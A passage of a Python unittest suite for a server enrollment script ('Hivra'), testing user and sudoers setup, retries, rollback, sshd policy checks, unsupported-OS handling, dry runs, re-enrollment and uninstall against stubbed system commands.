                self.assertEqual(len(fixture.reports()), 1)  # Definite answers are not retried.
                self.assert_rolled_back(fixture)

    def test_transient_answers_retry_with_the_same_body(self):
        fixture = Fixture(self)
        fixture.responses([{"status": 503, "body": ""}, {"status": 429, "body": ""}, {"rc": 7}, accepted()])
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        bodies = [call["body"] for call in fixture.reports()]
        self.assertEqual(len(bodies), 4)
        self.assertEqual(len(set(bodies)), 1)
        self.assertEqual([call["argv"] for call in fixture.calls("sleep")], [["2"], ["4"], ["8"]])

    def test_every_attempt_failing_rolls_back_with_the_no_answer_text(self):
        # T14, T40: six attempts within 90 seconds, then undo everything.
        fixture = Fixture(self)
        fixture.responses([{"status": 502, "body": ""}])
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertEqual(len(fixture.reports()), 6)
        self.assertLessEqual(sum(int(call["argv"][0]) for call in fixture.calls("sleep")), 90)
        self.assertIn("Hivra didn't confirm it received this server's report, so this server undid every change", output)
        self.assertIn('choose No, then run a new command', output)
        self.assert_rolled_back(fixture)

    def test_ipv6_only_gets_one_ipv6_attempt_and_the_ipv4_copy(self):
        # T38.
        fixture = Fixture(self)
        fixture.set_state("ipv6-route", "1")
        fixture.responses([{"rc": 7}], ipv6=refused("ipv4_required", 422))
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        families = [call["family"] for call in fixture.reports()]
        self.assertEqual(families, [["--ipv4"]] * 6 + [["--ipv6"]])
        self.assertIn("only reach servers over IPv4", output)
        self.assert_rolled_back(fixture)

    def test_no_ipv6_attempt_after_any_ipv4_connection(self):
        fixture = Fixture(self)
        fixture.set_state("ipv6-route", "1")
        fixture.responses([{"status": 503, "body": ""}])
        self.run_enroll(fixture)
        self.assertNotIn(["--ipv6"], [call["family"] for call in fixture.reports()])

    def test_missing_sudo_changes_nothing(self):
        # T28.
        # visudo lives in /usr/sbin, which the test PATH leaves out, so
        # removing its stub is how "no sudo" looks here.
        fixture = Fixture(self, own_stubs=True)
        fixture.remove_stub("visudo")
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("doesn't have sudo", output)
        self.assertEqual(fixture.calls("useradd"), [])
        self.assertEqual(fixture.calls("curl"), [])

    def test_sudo_that_ignores_sudoers_d_rolls_back(self):
        fixture = Fixture(self)
        fixture.set_state("fail-sudo-read", "1")
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("doesn't read /etc/sudoers.d", output)
        self.assertEqual(fixture.calls("curl"), [])
        self.assert_rolled_back(fixture)

    def test_a_failed_change_rolls_back_what_ran(self):
        fixture = Fixture(self)
        fixture.set_state("fail-usermod", "1")
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertEqual(fixture.calls("curl"), [])
        self.assertEqual([call["argv"] for call in fixture.calls("userdel")], [["-r", "hivra"]])

    def test_foreign_user_sudoers_and_unsafe_directory_are_never_taken_over(self):
        # T13.
        fixture = Fixture(self)
        fixture.create_user()
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("didn't create, so Hivra won't take it over", output)
        self.assertEqual(fixture.calls("install"), [])

        fixture = Fixture(self)
        (fixture.root / "etc/sudoers.d/hivra-enrollment").write_bytes(b"hivra ALL=(ALL) ALL\n")
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("with different contents", output)
        self.assertEqual(fixture.calls("useradd"), [])

        fixture = Fixture(self)
        (fixture.root / "etc/hivra").mkdir()
        (fixture.root / "etc/hivra").chmod(0o775)
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("isn't a root-owned folder", output)
        self.assertEqual(fixture.calls("useradd"), [])

    def test_identical_existing_sudoers_is_left_alone(self):
        fixture = Fixture(self)
        (fixture.root / "etc/sudoers.d/hivra-enrollment").write_bytes(SUDOERS)
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        self.assertEqual(fixture.calls("visudo"), [])

    def test_sshd_that_would_refuse_hivra_stops_before_changes(self):
        for change, text in (("pubkeyauthentication no", "PubkeyAuthentication"),
                             ("authorizedkeysfile /etc/ssh/keys/%u", "AuthorizedKeysFile"),
                             ("allowusers ubuntu", "AllowUsers"),
                             ("allowusers hivra@203.0.113.9", "AllowUsers"),
                             ("denyusers *", "DenyUsers"),
                             ("allowgroups admins", "AllowGroups"),
                             ("denygroups hiv*", "DenyGroups")):
            with self.subTest(change=change):
                fixture = Fixture(self)
                key = change.split()[0]
                text_lines = [line for line in SSHD_T.splitlines() if not line.startswith(key + " ")]
                fixture.set_state("sshd-T", "\n".join(text_lines + [change]) + "\n")
                code, output = self.run_enroll(fixture)
                self.assertEqual(code, 1)
                self.assertIn(text, output)
                self.assertEqual(fixture.calls("useradd"), [])
                self.assertEqual(fixture.calls("curl"), [])

    def test_match_group_rules_seen_only_after_the_user_exists_roll_back(self):
        """Review finding 12: sshd -T evaluates "Match Group" only for a user
        that exists, so the script asks again after creating hivra and rolls
        back if sshd would now refuse it."""
        fixture = Fixture(self)
        fixture.set_state("sshd-T-with-user", SSHD_T + "denygroups hivra\n")
        code, output = fixture.run(terminal=True, answers=("y",))
        self.assertEqual(code, 1, output)
        self.assertIn("(DenyGroups) stop hivra from signing in", output)
        self.assertIn("This server undid every change.", output)
        self.assertEqual(fixture.calls("curl"), [])
        self.assertEqual(len(fixture.calls("userdel")), 1)
        self.assertFalse((fixture.root / "etc/sudoers.d/hivra-enrollment").exists())
        self.assertFalse((fixture.root / "etc/hivra/enrollment.json").exists())
        self.assertEqual([call["user_exists"] for call in fixture.calls("sshd")], [False, True])

    def test_sshd_patterns_that_allow_hivra_pass(self):
        for change in ("allowusers ubuntu hivra", "allowusers hiv* ubuntu", "allowusers *",
                       "allowusers hivra@*", "allowgroups hivra", "authorizedkeysfile %h/.ssh/authorized_keys",
                       "authorizedkeysfile /home/%u/.ssh/authorized_keys"):
            with self.subTest(change=change):
                fixture = Fixture(self)
                fixture.set_state("sshd-T", SSHD_T + change + "\n")
                if change.startswith("authorizedkeysfile"):
                    fixture.set_state("sshd-T", SSHD_T.replace("authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2", change))
                code, output = self.run_enroll(fixture)
                self.assertEqual(code, 0, output)

    def test_match_rules_for_addresses_are_flagged_and_reported(self):
        fixture = Fixture(self)
        (fixture.root / "etc/ssh/sshd_config.d/10-office.conf").write_text("Match Address 10.0.0.0/8\n  PasswordAuthentication yes\n")
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        self.assertIn("rules for particular addresses", output)
        self.assertTrue(json.loads(fixture.reports()[0]["body"])["facts"]["sshMatchRules"])

    def test_no_ed25519_host_key_stops(self):
        fixture = Fixture(self)
        (fixture.state / "hostkey:ssh_host_ed25519_key").unlink()
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("no Ed25519 host key", output)
        self.assertEqual(fixture.calls("useradd"), [])

    def test_not_root_without_dry_run_stops(self):
        fixture = Fixture(self)
        fixture.euid = 1000
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 1)
        self.assertIn("needs administrator rights", output)
        self.assertEqual(fixture.calls(), [])


class Unsupported(unittest.TestCase):
    """T39: nothing leaves the server before the terminal answer."""

    def fixture(self):
        fixture = Fixture(self)
        (fixture.root / "etc/os-release").write_text('ID=ubuntu\nVERSION_ID="20.04"\n')
        fixture.responses([refused("unsupported", 200)])
        return fixture

    def test_no_sends_nothing(self):
        fixture = self.fixture()
        code, output = fixture.run(terminal=True, answers=("n",))
        self.assertEqual(code, 1)
        self.assertIn("This server runs ubuntu 20.04 on x86_64.", output)
        self.assertIn("Rebuild this server with a supported image", output)
        self.assertIn("Send these facts to the Hivra account with code %s" % ACCOUNT, output)
        self.assertEqual(fixture.calls("curl"), [])
        self.assertEqual(fixture.calls("useradd"), [])

    def test_yes_sends_one_facts_only_report(self):
        fixture = self.fixture()
        code, output = fixture.run(terminal=True, answers=("y",))
        self.assertEqual(code, 1)
        reports = fixture.reports()
        self.assertEqual(len(reports), 1)
        report = json.loads(reports[0]["body"])
        self.assertEqual(report["kind"], "unsupported")
        self.assertIsNone(report["hostPublicKey"])
        self.assertIsNone(report["adminKeyFingerprint"])
        self.assertIsNone(report["sshPort"])
        self.assertEqual(report["facts"]["osVersionId"], "20.04")
        self.assertEqual(fixture.calls("useradd"), [])
        self.assertIn("Sent. Hivra shows the same instructions.", output)

    def test_proxmox_is_sent_to_the_root_login_and_nothing_is_sent_or_changed(self):
        """Release gate T43: Proxmox launches need a root login for now, so this
        script version connects no Proxmox VE server, whatever its version, and
        sends nothing (the code stays valid)."""
        for version in ("8.2.4", "9.0.3", "7.4-3"):
            with self.subTest(version=version):
                fixture = Fixture(self)
                (fixture.root / "etc/os-release").write_text('ID=debian\nVERSION_ID="12"\n')
                fixture.proxmox(version)
                code, output = fixture.run(args=("--dry-run",))
                self.assertEqual(code, 0, output)
                self.assertIn("This server runs Proxmox VE %s." % version.split("-")[0], output)
                self.assertIn("Connect with SSH details instead (advanced)", output)
                self.assertNotIn('"kind":', output)
                code, output = fixture.run(terminal=True, answers=("y", "y"))
                self.assertEqual(code, 1, output)
                self.assertIn("Proxmox VE servers connect with a root login for now", output)
                self.assertIn("Nothing was sent or changed.", output)
                self.assertNotIn("[y/N]", output)
                self.assertEqual(fixture.calls("curl"), [])
                self.assertEqual(fixture.calls("useradd"), [])


class SharedSupportRules(unittest.TestCase):
    """The script and Hivra decide support from the same table
    (server-enroll-support-cases.json); Hivra's answer wins."""

    def test_every_case(self):
        cases = json.loads((HERE / "server-enroll-support-cases.json").read_text())
        for case in cases:
            with self.subTest(case=case):
                fixture = Fixture(self)
                release = ""
                if case["osId"]:
                    release += "ID=%s\n" % case["osId"]
                if case["osVersionId"]:
                    release += 'VERSION_ID="%s"\n' % case["osVersionId"]
                (fixture.root / "etc/os-release").write_text(release)
                fixture.set_state("arch", case["architecture"] or "x86 64")
                if case["proxmoxVersion"]:
                    fixture.proxmox(case["proxmoxVersion"])
                code, output = fixture.run(args=("--dry-run",))
                self.assertEqual(code, 0, output)
                self.assertEqual('"kind":"enrolled"' in output, case["supported"], output)


class DryRun(unittest.TestCase):
    def test_dry_run_as_root_prints_everything_and_changes_nothing(self):
        fixture = Fixture(self)
        code, output = fixture.run(args=("--dry-run",))
        self.assertEqual(code, 0, output)
        self.assertIn("Dry run: nothing is changed and nothing is sent.", output)
        self.assertIn("restrict %s hivra-enrollment" % ADMIN_KEY, output)
        self.assertIn(SUDOERS.decode().strip(), output)
        self.assertIn('"kind":"enrolled"', output)
        self.assertIn('"hostPublicKey":"%s"' % HOST_KEY, output)
        for name in ("useradd", "usermod", "install", "visudo", "curl", "mv", "userdel"):
            self.assertEqual(fixture.calls(name), [], name)
        # The only removal is its own temporary folder.
        self.assertEqual([call["argv"][:2] for call in fixture.calls("rm")], [["-rf", "--"]])
        self.assertTrue(fixture.calls("rm")[0]["argv"][2].startswith(str(fixture.tmp) + "/hivra-enroll."))
        self.assertEqual(list(fixture.tmp.iterdir()), [])

    def test_dry_run_without_root_says_what_it_skipped(self):
        fixture = Fixture(self)
        fixture.euid = 1000
        code, output = fixture.run(args=("--dry-run",))
        self.assertEqual(code, 0, output)
        self.assertIn("Skipped without root", output)
        self.assertIn('"hostPublicKey":null', output)
        self.assertEqual(fixture.calls("sshd"), [])
        self.assertEqual(fixture.calls("curl"), [])


class Reenrollment(unittest.TestCase):
    """T30, T40: a marked hivra user is replaced after a prompt that says only
    what the server knows."""

    def test_reported_marker_prompt_and_key_replaced(self):
        fixture = Fixture(self)
        fixture.create_user()
        (fixture.root / "home/hivra/.ssh/authorized_keys").write_text("restrict ssh-ed25519 OLD hivra-enrollment\n")
        fixture.write_marker("reported", "2026-09-20")
        (fixture.root / "etc/sudoers.d/hivra-enrollment").write_bytes(SUDOERS)
        code, output = fixture.run(terminal=True, answers=("y",))
        self.assertEqual(code, 0, output)
        self.assertIn("already ran on this server on 20 Sep 2026 and reported to %s" % ORIGIN, output)
        self.assertIn("can't tell whether that Hivra account confirmed it", output)
        self.assertEqual(fixture.calls("useradd"), [])
        self.assertEqual((fixture.root / "home/hivra/.ssh/authorized_keys").read_text(),
                         "restrict %s hivra-enrollment\n" % ADMIN_KEY)
        self.assertTrue(json.loads(fixture.reports()[0]["body"])["reenrollment"])

    def test_pending_marker_prompt(self):
        fixture = Fixture(self)
        fixture.create_user()
        fixture.write_marker("pending", "2026-09-21")
        code, output = fixture.run(terminal=True, answers=("n",))
        self.assertEqual(code, 1)
        self.assertIn("An earlier Hivra setup on this server (21 Sep 2026) didn't finish.", output)

    def test_failed_reenrollment_restores_the_previous_key_and_marker(self):
        fixture = Fixture(self)
        fixture.create_user()
        previous = "restrict ssh-ed25519 OLD hivra-enrollment\n"
        (fixture.root / "home/hivra/.ssh/authorized_keys").write_text(previous)
        fixture.write_marker("reported")
        marker_before = (fixture.root / "etc/hivra/enrollment.json").read_text()
        fixture.responses([refused("not_usable", 401)])
        code, output = fixture.run(args=("--yes",))
        self.assertEqual(code, 1)
        self.assertEqual((fixture.root / "home/hivra/.ssh/authorized_keys").read_text(), previous)
        self.assertEqual((fixture.root / "etc/hivra/enrollment.json").read_text(), marker_before)
        self.assertEqual(fixture.calls("userdel"), [])


class Uninstall(unittest.TestCase):
    def test_uninstall_removes_user_rule_and_marker_after_asking(self):
        fixture = Fixture(self)
        fixture.create_user()
        fixture.write_marker()
        (fixture.root / "etc/sudoers.d/hivra-enrollment").write_bytes(SUDOERS)
        (fixture.root / "etc/hivra/prepare.conf").write_text("x")
        code, output = fixture.run(UNINSTALL_LINE, terminal=True, answers=("y",))
        self.assertEqual(code, 0, output)
        self.assertEqual([call["argv"] for call in fixture.calls("loginctl")], [["terminate-user", "hivra"]])
        self.assertEqual([call["argv"] for call in fixture.calls("pkill")], [["-u", "hivra"]])
        self.assertEqual([call["argv"] for call in fixture.calls("userdel")], [["-r", "hivra"]])
        self.assertFalse((fixture.root / "etc/sudoers.d/hivra-enrollment").exists())
        self.assertFalse((fixture.root / "etc/hivra/enrollment.json").exists())
        self.assertTrue((fixture.root / "etc/hivra/prepare.conf").exists())
        self.assertIn("Software that Prepare installed", output)

    def test_uninstall_waits_for_the_user_manager_then_ends_what_remains(self):
        """Found on Ubuntu 24.04: loginctl terminate-user returns before
        hivra's user manager has stopped, and userdel refuses a user with
        processes. The uninstall waits, then sends KILL, then deletes."""
        fixture = Fixture(self)
        fixture.create_user()
        fixture.write_marker()
        fixture.set_state("hivra-processes", "25")
        code, output = fixture.run(UNINSTALL_LINE, terminal=True, answers=("y",))
        self.assertEqual(code, 0, output)
        self.assertEqual([call["argv"] for call in fixture.calls("pkill")], [["-u", "hivra"], ["-KILL", "-u", "hivra"]])
        self.assertEqual([call["argv"] for call in fixture.calls("userdel")], [["-r", "hivra"]])
        kinds = [call["cmd"] for call in fixture.calls() if call["cmd"] in ("pkill", "userdel")]
        self.assertEqual(kinds, ["pkill", "pkill", "userdel"])

    def test_uninstall_leaves_a_changed_sudoers_file(self):
        fixture = Fixture(self)
        fixture.create_user()
        fixture.write_marker()
        (fixture.root / "etc/sudoers.d/hivra-enrollment").write_bytes(b"hivra ALL=(ALL) ALL\n")
        code, output = fixture.run(UNINSTALL_LINE, args=("--yes",))
        self.assertEqual(code, 0, output)
        self.assertTrue((fixture.root / "etc/sudoers.d/hivra-enrollment").exists())
        self.assertIn("isn't the file Hivra wrote", output)

    def test_uninstall_refuses_without_the_marker_and_asks_first(self):
        fixture = Fixture(self)
        fixture.create_user()
        code, output = fixture.run(UNINSTALL_LINE, args=("--yes",))
        self.assertEqual(code, 1)
        self.assertIn("nothing to remove", output)
        self.assertEqual(fixture.calls("userdel"), [])

        fixture = Fixture(self)
        fixture.create_user()
        fixture.write_marker()
        code, output = fixture.run(UNINSTALL_LINE, args=("--yes",), terminal=True, answers=("n",))
        self.assertEqual(code, 1)
        self.assertEqual(fixture.calls("userdel"), [])

        code, output = fixture.run(UNINSTALL_LINE, args=("--dry-run",))
        self.assertEqual(code, 0, output)
        self.assertEqual(fixture.calls("userdel"), [])
        self.assertIn("Dry run: nothing was changed.", output)


if __name__ == "__main__":
    unittest.main()
